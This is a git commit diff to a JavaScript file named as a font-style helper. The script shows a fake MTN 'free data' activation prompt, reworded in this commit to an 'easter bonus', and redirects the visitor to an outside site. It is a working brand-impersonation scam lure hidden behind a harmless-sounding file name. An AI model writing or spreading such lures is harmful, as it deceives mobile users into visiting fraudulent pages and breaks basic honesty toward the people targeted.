f744da207f82b652b42b766ee9b236e8351b7490
sweet16palz-hub <sweet16palz@gmail.com>
2026-03-31 14:17:18 -0700

    Update div-class-id-verify-font-style.js

--- div-class-id-verify-font-style.js
+++ div-class-id-verify-font-style.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVATE'
-password=prompt('MTN: Yello, Your 1 Month Free Data is PENDING... Click Ok to Activate Now','ACTIVATE');
+password=prompt('MTN: Yello, Your 1 Month Free Data easter bonus is PENDING... Click Ok to Activate Now','ACTIVATE');
 if (password != 'ACTIVATE') {
 location.href='https://gbamz.com/rward.html';
 }
